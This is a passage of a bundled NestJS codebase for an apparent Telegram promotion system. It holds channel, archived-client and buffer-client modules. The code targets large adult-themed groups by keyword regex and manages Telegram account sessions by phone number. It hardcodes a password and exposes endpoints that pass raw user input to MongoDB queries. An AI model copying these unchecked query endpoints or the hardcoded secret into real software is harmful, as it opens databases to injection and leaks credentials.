};\r\n        } catch (error) {\r\n            const parsedError = parseError(error);\r\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\r\n                error: parsedError,\r\n                stack: error.stack,\r\n                errorType: error.constructor.name,\r\n                code: verifyCodeDto.code?.length || 0\r\n            });\r\n            \r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n            \r\n            throw new BadRequestException(parsedError.message || 'Verification failed');\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\r\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { ActiveChannel } from './schemas/active-channel.schema';\r\nimport { AddReactionDto } from './dto/add-reaction.dto';\r\n\r\n@ApiTags('Active Channels')\r\n@Controller('active-channels')\r\nexport class ActiveChannelsController {\r\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new active channel' })\r\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\r\n    return this.activeChannelsService.create(createActiveChannelDto);\r\n  }\r\n\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateActiveChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\r\n    return this.activeChannelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  @ApiQuery({ name: 'channelId', required: false, type: String })\r\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\r\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'title', required: false, type: String })\r\n  @ApiQuery({ name: 'username', required: false, type: String })\r\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\r\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\r\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\r\n  search(@Query() query: any): Promise<ActiveChannel[]> {\r\n    console.log(query);\r\n    return this.activeChannelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all active channels' })\r\n  async findAll() {\r\n    return this.activeChannelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\r\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.remove(channelId);\r\n  }\r\n\r\n  @Post(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Add reaction to chat group' })\r\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\r\n  }\r\n\r\n  @Get(':channelId/reactions/random')\r\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\r\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\r\n    return this.activeChannelsService.getRandomReaction(channelId);\r\n  }\r\n\r\n  @Delete(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\r\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\r\n  }\r\n}\r\n","// src/activechannels/activechannels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { ActiveChannelsController } from './active-channels.controller';\r\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\r\n    PromoteMsgModule\r\n  ],\r\n  controllers: [ActiveChannelsController],\r\n  providers: [ActiveChannelsService],\r\n  exports: [ActiveChannelsService]\r\n})\r\nexport class ActiveChannelsModule { }\r\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { defaultMessages, fetchWithTimeout, parseError, ppplbot } from '../../utils';\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\n          '👀', '🙈', '🤝', '🤗', '🆒',\n          '🗿', '🙉', '🙊', '🤷', '👎'\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\r\n\r\nexport class AddReactionDto  {\r\n    @ApiProperty({required: true})\r\n    reactions: string[]\r\n}\r\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\n      '👀', '🙈', '🤝', '🤗', '🆒',\n      '🗿', '🙉', '🙊', '🤷', '👎'\n    ]\n  })\n  reactions?: string[] = [\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\n    '👀', '🙈', '🤝', '🤗', '🆒',\n    '🗿', '🙉', '🙊', '🤷', '👎'\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\r\n\r\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { Client } from '../clients/schemas/client.schema';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\r\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\r\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\r\n\r\n@ApiTags('Archived Clients')\r\n@Controller('archived-clients')\r\nexport class ArchivedClientController {\r\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    return this.archivedclientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    return this.archivedclientService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async findAll(): Promise<Client[]> {\r\n    return this.archivedclientService.findAll();\r\n  }\r\n  \r\n  @Get('checkArchivedClients')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async checkArchivedClients(): Promise<string> {\r\n    return this.archivedclientService.checkArchivedClients();\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.findOne(mobile);\r\n  }\r\n  \r\n  @Get('fetchOne/:mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.fetchOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    return this.archivedclientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\r\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\r\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\r\n  @ApiBody({type: Object})\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.archivedclientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ClientSchema } from '../clients/schemas/client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { ArchivedClientController } from './archived-client.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [ArchivedClientController],\r\n  providers: [ArchivedClientService],\r\n  exports: [ArchivedClientService]\r\n})\r\nexport class ArchivedClientModule { }\r\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils';\n\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await this.telegramService.createClient(mobile, false, true)\n                const newSession = await this.telegramService.createNewSession(mobile);\n                await this.telegramService.deleteClient(mobile)\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\"\n                })\n            } catch (e) {\n                await this.telegramService.deleteClient(mobile)\n                throw new NotFoundException(parseError(e).message);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await this.telegramService.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await this.telegramService.createClient(document.mobile, true, false);\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await this.telegramService.deleteClient(document.mobile)\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\r\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\r\nimport { BufferClient } from './schemas/buffer-client.schema';\r\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\r\n\r\n@ApiTags('Buffer Clients')\r\n@Controller('bufferclients')\r\nexport class BufferClientController {\r\n  constructor(private readonly clientService: BufferClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForBufferClients')\r\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\r\n  async joinChannelsforBufferClients(): Promise<string> {\r\n    return this.clientService.joinchannelForBufferClients();\r\n  }\r\n\r\n  @Get('checkBufferClients')\r\n  @ApiOperation({ summary: 'Check Buffer Clients' })\r\n  async checkbufferClients(): Promise<string> {\r\n    this.clientService.checkBufferClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoBufferClients')\r\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<BufferClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsBufferClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Buffer Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String 